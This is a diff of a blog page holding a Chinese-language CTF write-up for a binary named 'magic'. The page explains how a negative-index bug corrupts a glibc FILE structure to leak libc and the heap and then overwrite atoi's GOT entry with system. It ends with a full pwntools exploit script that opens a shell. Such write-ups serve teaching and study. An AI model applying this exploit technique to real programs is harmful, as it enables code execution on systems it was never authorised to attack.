@@ -176,29 +176,16 @@
 <p>我们先初始化一个<code>wizard[0]</code> ，以初始化<code>FILE</code> 结构体，在<code>wizard_spell</code> 返回前断下。</p>
 <p><img src="https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png" alt=""></p>
 <p>简单计算一下，<code>656=14*50-44</code> ，也就是至少调用14次<code>wizard_spell</code> ，然后在这14次中应该输入44个字符串，因为每次<code>_IO_write_ptr</code> 还会加上输入的字符串数。这里经过反复调试（因为FILE前后数据段有很多重要参数，我们每次都修改了某些参数，很容易使程序崩溃），最终得到了一个不会崩溃的输入序列</p>
-<pre><code class="python">for i in range(11):
-    spell(-2, &#39;\x00&#39;)
-spell(-2, &#39;\x00&#39; * 11)
-spell(-2, &#39;\x00&#39; * 11)
-spell(-2, &#39;\x00&#39; * 11)</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
 <p>这时<code>_IO_write_ptr</code>位于<code>FILE</code>-1的位置，调试一下确实如此，所以就可以输入数据覆盖<code>FILE</code> 结构了</p>
 <p><img src="https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png" alt=""></p>
 <h3 id="泄露libc与heap-base"><a href="#泄露libc与heap-base" class="headerlink" title="泄露libc与heap_base"></a>泄露<code>libc</code>与<code>heap_base</code></h3><p>紧接上文，我们可以将<code>FILE</code>的<code>_IO_read_ptr</code>的值修改为<code>atoi_got</code>，这样在下一次调用<code>wizard_spell</code> 时调用<code>fwrite</code> 会将<code>_IO_read_ptr</code>指向的值也就是<code>atoi</code> 的实际地址读入到<code>log_file</code> 中，然后通过<code>fread</code> 打印出来，泄露<code>libc</code> 。需要注意这里我们应该向<code>wizard[0]</code> 而不是<code>wizard[-2]</code>中输入payload，因为我们并不想让<code>_IO_write_ptr</code> 减少50。同时应该尽量保持其他<code>FILE</code> 数据不变。</p>
-<pre><code class="python"># leak libc
-payload = &#39;\x00&#39;
-payload += p64(0xfbad24a8)
-spell(0,payload)
-payload = p64(atoi_got) + p64(atoi_got + 0x100)
-spell(0,payload)
-atoi_addr = u64(p.recv(8))
-print hex(atoi_addr)</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">'\x00'</span></span><br><span class="line">payload += p64(<span class="number">0xfbad24a8</span>)</span><br><span class="line">spell(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(atoi_got) + p64(atoi_got + <span class="number">0x100</span>)</span><br><span class="line">spell(<span class="number">0</span>,payload)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br></pre></td></tr></table></figure>
+
 <p>于是我们泄露了<code>libc</code> ，此时的<code>_IO_write_ptr</code>指向了<code>_IO_read_base</code> ，也即<code>FILE</code> +24偏移处，所以我们重新利用<code>wizard[-2]</code> 来使<code>_IO_write_ptr</code>指回<code>FILE</code> 首地址，继续修改<code>FILE</code> 来泄露<code>heap_base</code> ，而<code>log_file</code> 为<code>FILE</code>指针，内容即为堆上的地址，用它来泄露<code>heap_base</code> 。</p>
-<pre><code class="python"># leak heap
-spell(-2, &#39;\x00&#39; * 0x10)
-spell(0, &#39;\x00&#39; * 10 + p64(0xfbad24a8))
-spell(0, p64(log_file) + p64(log_file + 0x50))
-heap = u64(p.recvn(8)) - 0x10
-print &#39;heap:&#39;,hex(heap)</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">0x10</span>)</span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'\x00'</span> * <span class="number">10</span> + p64(<span class="number">0xfbad24a8</span>))</span><br><span class="line">spell(<span class="number">0</span>, p64(log_file) + p64(log_file + <span class="number">0x50</span>))</span><br><span class="line">heap = u64(p.recvn(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'heap:'</span>,hex(heap)</span><br></pre></td></tr></table></figure>
+
 <h3 id="修改atoi-got-表项"><a href="#修改atoi-got-表项" class="headerlink" title="修改atoi_got 表项"></a>修改<code>atoi_got</code> 表项</h3><p>紧接上文，我们现在的<code>_IO_write_ptr</code>指向了<code>_IO_read_base</code> 。我们下一步是想写<code>atoi_got</code> 表项为<code>system</code> ，就像上面一样很自然的思路当然是修改<code>_IO_write_ptr</code> 使其指向<code>atoi_got</code> ，但这是不行的。</p>
 <p>回想最开始的一句话，再重复一遍予以强调。</p>
 <blockquote>
@@ -207,145 +194,25 @@ print &#39;heap:&#39;,hex(heap)</code></pre>
 </blockquote>
 <p>具体原因可以在源码中看到，当我们调用写函数并试图修改写指针，写操作完成后<code>_IO_write_ptr</code> 会再一次被覆盖，变回了原来的正常情况地址；读函数也类似。在上面的利用过程可以看到我们是利用<code>fwrite</code> 修改<code>_IO_read_ptr</code> ，所以才能成功泄露。也就是说，如果我们想改写<code>atoi_got</code> 表项，我们应该利用<code>fread</code> 改写<code>_IO_write_ptr</code> 。</p>
 <h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p><font color=red> 这里我们解释一下为什么</font>，笔者说说自己的看法，当然如果耐心看看源码可能会有新的理解，下列代码节选自<code>_IO_new_file_xsputn</code> ，也即<code>fwrite</code> 核心实现函数。</p>
-<pre><code class="python">...
-if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
-    count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;
-else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)
-    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;
-...
-...
-// 利用memcpy实现写，其中s为data地址
-#ifdef _LIBC
-        f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);
-#else
-        memcpy(f-&gt;_IO_write_ptr, s, count);
-        f-&gt;_IO_write_ptr += count;</code></pre>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">	count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">// 利用memcpy实现写，其中s为data地址</span><br><span class="line"><span class="comment">#ifdef _LIBC</span></span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="comment">#else</span></span><br><span class="line">        memcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        f-&gt;_IO_write_ptr += count;</span><br></pre></td></tr></table></figure>
+
 <p>我们想想如果在<code>fwrite</code> 中想改变<code>_IO_write_ptr</code>为A会发生什么，在执行<code>__memcpy</code> 前<code>_IO_write_ptr</code>均为原值B，但是s的内容为A（我们试图改变<code>_IO_write_ptr</code>为A），在<code>__memcpy</code>的过程中<code>_IO_write_ptr</code>确实被改为A了，但不要忘了 还需要将它的返回值赋给<code>_IO_write_ptr</code>，所以<code>_IO_write_ptr</code>变回了<code>B+count</code> ，一如正常执行后的结果！至此我们明白了，为什么<code>fwrite</code> 改变<code>_IO_write_ptr</code>并不奏效。</p>
 <h4 id="回归正题"><a href="#回归正题" class="headerlink" title="回归正题"></a>回归正题</h4><p>所以怎么利用<code>fread</code> 改写<code>_IO_write_ptr</code>，然后在下一次<code>wizard_spell</code> 中就能实现指定位置写呢？这里还是要从<code>fread</code> 源码入手，它的核心实现落到了<code>_IO_file_xsgetn</code> 上，部分源码如下</p>
-<pre><code class="python">    ...
-    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
-    return *(unsigned char *)fp-&gt;_IO_read_ptr;
-    ...
-    ...
-    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
-    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
-    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;
-    //调用系统接口读入
-    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,
-                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></pre>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">   return *(unsigned char *)fp-&gt;_IO_read_ptr;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line">//调用系统接口读入</span><br><span class="line">   count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,</span><br><span class="line">                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure>
+
 <p>这里我们首先得绕过第一个判断（不然不读了），然后发现它把很多<code>FILE</code> 指针的值都变为了<code>_IO_buf_base</code>，包括 <code>_IO_write_ptr</code>。我们无法在<code>fwrite</code> 中顺利改变<code>_IO_write_ptr</code>，何不改变<code>_IO_buf_base</code>，然后在调用<code>fread</code> 后就能改变<code>_IO_write_ptr</code> 了。尝试一下：</p>
-<pre><code class="python">spell(0, p64(log_file) + p64(heap + 0x200) * 3)
-spell(0, p64(atoi_got) + p64(atoi_got + 0xAAA))</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spell(<span class="number">0</span>, p64(log_file) + p64(heap + <span class="number">0x200</span>) * <span class="number">3</span>)</span><br><span class="line">spell(<span class="number">0</span>, p64(atoi_got) + p64(atoi_got + <span class="number">0xAAA</span>))</span><br></pre></td></tr></table></figure>
+
 <p>很遗憾，调试发现并没有改写成功。我发誓，这是最后一个需要注意的地方。</p>
 <p>我们想把<code>_IO_buf_base</code>赋值为<code>atoi_got</code> ，然后让<code>_IO_write_ptr</code> 也变为这个值。再回头看看<code>fwrite</code> 源码不难发现，由于<code>_IO_write_end</code>也被赋值为<code>_IO_buf_base</code>，所以在<code>fwrite</code> 中<code>count</code> 为0，不会再读了！</p>
-<pre><code class="python">if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
-    {
-        count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;
-        ...
-    }
-else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)
-        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">        count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */</span><br><span class="line"></span><br><span class="line">    /* Then fill the buffer. */</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">            count = to_do;</span><br><span class="line"><span class="comment">#ifdef _LIBC</span></span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="comment">#else</span></span><br><span class="line">        memcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        f-&gt;_IO_write_ptr += count;</span><br></pre></td></tr></table></figure>
 
-    /* Then fill the buffer. */
-    if (count &gt; 0)
-    {
-        if (count &gt; to_do)
-            count = to_do;
-#ifdef _LIBC
-        f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);
-#else
-        memcpy(f-&gt;_IO_write_ptr, s, count);
-        f-&gt;_IO_write_ptr += count;</code></pre>
 <p>好了，所以我们最终如下操作，先把<code>_IO_write_end</code>与<code>_IO_write_ptr</code>都改为<code>atoi_got + 143</code> ，最后再利用负下标漏洞把<code>_IO_write_ptr</code>向下滑倒<code>atoi_got</code> -1，于是目的就达成了。</p>
-<pre><code class="python"># change atoi to system
-spell(0, p64(log_file) + p64(heap + 0x200) * 3)
-spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA))
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change atoi to system</span></span><br><span class="line">spell(<span class="number">0</span>, p64(log_file) + p64(heap + <span class="number">0x200</span>) * <span class="number">3</span>)</span><br><span class="line">spell(<span class="number">0</span>, p64(atoi_got + <span class="number">143</span>) + p64(atoi_got + <span class="number">0xAAA</span>))</span><br><span class="line"></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">3</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">3</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span> + p64(system)</span><br><span class="line">spell(<span class="number">0</span>, payload)</span><br></pre></td></tr></table></figure>
 
-spell(-2, &#39;\x00&#39;)
-spell(-2, &#39;\x00&#39; * 3)
-spell(-2, &#39;\x00&#39; * 3)
-payload = &#39;\x00&#39; + p64(system)
-spell(0, payload)</code></pre>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ubuntu16.04测试成功</p>
-<pre><code class="python">#! /usr/bin/env python
-from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./magic'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./magic'</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">log_file = elf.sym[<span class="string">'log_file'</span>]</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Give me the wizard's name:"</span>, <span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spell</span><span class="params">(index, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Who will spell:'</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">'Spell name:'</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause</span><span class="params">(p, s = <span class="string">'pause'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">create()</span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span></span><br><span class="line">payload += p64(<span class="number">0xfbad24a8</span>)</span><br><span class="line">spell(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(atoi_got) + p64(atoi_got + <span class="number">0x100</span>)</span><br><span class="line">spell(<span class="number">0</span>,payload)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">offset= atoi_addr - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system = offset + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">0x10</span>)</span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'\x00'</span> * <span class="number">10</span> + p64(<span class="number">0xfbad24a8</span>))</span><br><span class="line">spell(<span class="number">0</span>, p64(log_file) + p64(log_file + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">heap = u64(p.recvn(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'heap:'</span>,hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># change atoi to system</span></span><br><span class="line">spell(<span class="number">0</span>, p64(log_file) + p64(heap + <span class="number">0x200</span>) * <span class="number">3</span>)</span><br><span class="line">spell(<span class="number">0</span>, p64(atoi_got + <span class="number">143</span>) + p64(atoi_got + <span class="number">0xAAA</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi_got:"</span>+hex(atoi_got)</span><br><span class="line"></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">3</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span> * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> + p64(system)</span><br><span class="line">spell(<span class="number">0</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>,<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-p = process(&#39;./magic&#39;)
-
-debug = 1
-if debug:
-    context.log_level = &#39;debug&#39;
-
-elf = ELF(&#39;./magic&#39;)
-atoi_got = elf.got[&#39;atoi&#39;]
-log_file = elf.sym[&#39;log_file&#39;]
-
-libc = elf.libc
-
-def create():
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;1&#39;)
-    p.sendlineafter(&quot;Give me the wizard&#39;s name:&quot;, &#39;aaa&#39;)
-
-def spell(index, name):
-    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
-    p.sendlineafter(&#39;Who will spell:&#39;, str(index))
-    p.sendafter(&#39;Spell name:&#39;, str(name))
-
-def pause(p, s = &#39;pause&#39;):
-    return raw_input(s)
-
-
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-# gdb.attach(p)
-create()
-spell(0, &#39;aaa&#39;)
-#pause()
-
-
-
-# leak libc
-for i in range(11):
-    spell(-2, &#39;\x00&#39;)
-spell(-2, &#39;\x00&#39; * 11)
-spell(-2, &#39;\x00&#39; * 11)
-spell(-2, &#39;\x00&#39; * 11)
-
-payload = &#39;\x00&#39;
-payload += p64(0xfbad24a8)
-spell(0,payload)
-payload = p64(atoi_got) + p64(atoi_got + 0x100)
-spell(0,payload)
-atoi_addr = u64(p.recv(8))
-print hex(atoi_addr)
-
-# gdb.attach(p)
-offset= atoi_addr - libc.sym[&#39;atoi&#39;]
-system = offset + libc.sym[&#39;system&#39;]
-
-
-# leak heap
-spell(-2, &#39;\x00&#39; * 0x10)
-spell(0, &#39;\x00&#39; * 10 + p64(0xfbad24a8))
-spell(0, p64(log_file) + p64(log_file + 0x50))
-
-heap = u64(p.recvn(8)) - 0x10
-print &#39;heap:&#39;,hex(heap)
-
-
-
-# change atoi to system
-spell(0, p64(log_file) + p64(heap + 0x200) * 3)
-spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA))
-print &quot;atoi_got:&quot;+hex(atoi_got)
-
-spell(-2, &#39;\x00&#39;)
-spell(-2, &#39;\x00&#39; * 3)
-spell(-2, &#39;\x00&#39; * 3)
-
-payload = &#39;\x00&#39; + p64(system)
-spell(0, payload)
-p.sendlineafter(&#39;choice&gt;&gt; &#39;,&#39;$0&#39;)
-p.interactive()</code></pre>
 
   </div>
 </article>
